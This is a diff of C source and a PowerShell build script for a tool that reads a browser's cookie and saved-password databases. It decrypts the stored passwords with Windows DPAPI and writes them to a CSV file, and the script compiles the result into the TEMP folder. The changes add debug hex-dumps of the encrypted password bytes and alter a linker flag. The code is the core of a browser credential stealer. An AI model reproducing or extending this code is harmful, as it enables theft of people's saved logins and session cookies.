@@ -33,9 +33,20 @@ void write_to_csv(FILE *file, const char *type, const char *col1, const char *co
 }
 
 char* decrypt_password(const void *enc_data, int enc_data_len) {
+    if (enc_data == NULL || enc_data_len <= 0) {
+        fprintf(stderr, "Invalid encrypted data or length\n");
+        return NULL;
+    }
+
     DATA_BLOB in_blob, out_blob;
     in_blob.pbData = (BYTE *)enc_data;
     in_blob.cbData = enc_data_len;
+
+    printf("Decrypting data of length: %d\n", enc_data_len);
+    for (int i = 0; i < enc_data_len; i++) {
+        printf("%02x ", ((unsigned char *)enc_data)[i]);
+    }
+    printf("\n");
 
     if (CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob)) {
         char *dec_data = (char *)malloc(out_blob.cbData + 1);
@@ -56,7 +67,6 @@ char* decrypt_password(const void *enc_data, int enc_data_len) {
         return NULL;
     }
 }
-
 
 void read_cookies(sqlite3 *db, FILE *file) {
     sqlite3_stmt *res;
@@ -94,6 +104,12 @@ void read_passwords(sqlite3 *db, FILE *file) {
         const char *username_value = (const char *)sqlite3_column_text(res, 1);
         const void *password_value = sqlite3_column_blob(res, 2);
         int password_len = sqlite3_column_bytes(res, 2);
+
+        printf("Encrypted password length: %d\n", password_len);
+        for (int i = 0; i < password_len; i++) {
+            printf("%02x ", ((unsigned char *)password_value)[i]);
+        }
+        printf("\n");
 
         char *dec_password = decrypt_password(password_value, password_len);
         if (dec_password) {
@@ -234,7 +250,7 @@ $env:Path += ";$w64devkitPath\bin"
 
 # Compile the C code using w64devkit GCC
 Write-Output "Compiling the C code..."
-& "$w64devkitPath\bin\gcc.exe" -o "$env:TEMP\read_browser_data.exe" $cFilePath "$w64devkitPath\include\sqlite3.c" -I"$w64devkitPath\include" -L"$w64devkitPath\lib" -lShell32
+& "$w64devkitPath\bin\gcc.exe" -o "$env:TEMP\read_browser_data.exe" $cFilePath "$w64devkitPath\include\sqlite3.c" -I"$w64devkitPath\include" -L"$w64devkitPath\lib" -lShell32 -Lcrypt32
 
 Write-Output "Compilation completed successfully!"
 
